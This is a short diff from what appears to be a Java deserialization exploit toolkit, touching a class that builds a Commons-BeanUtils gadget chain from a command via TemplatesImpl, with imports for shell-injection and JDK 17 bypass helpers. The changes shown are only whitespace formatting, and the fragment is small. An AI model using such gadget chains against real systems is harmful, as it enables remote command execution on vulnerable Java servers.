@@ -9,7 +9,6 @@ import org.apache.commons.beanutils.BeanComparator;
 
 import java.util.PriorityQueue;
 
-
 import static com.qi4l.JYso.gadgets.utils.InjShell.insertField;
 import static com.qi4l.JYso.gadgets.utils.jdk17Bypass.patchModule;
 
@@ -21,8 +20,8 @@ public class cb160 implements ObjectPayload<Object> {
     public Object getObject(String command) throws Exception {
         final Object template = Gadgets.createTemplatesImpl(command);
 
-        ClassPool pool    = ClassPool.getDefault();
-        CtClass   ctClass = pool.get("org.apache.commons.beanutils.BeanComparator");
+        ClassPool pool = ClassPool.getDefault();
+        CtClass ctClass = pool.get("org.apache.commons.beanutils.BeanComparator");
         insertField(ctClass, "serialVersionUID", "private static final long serialVersionUID = 2573799559215537819;");
 
 
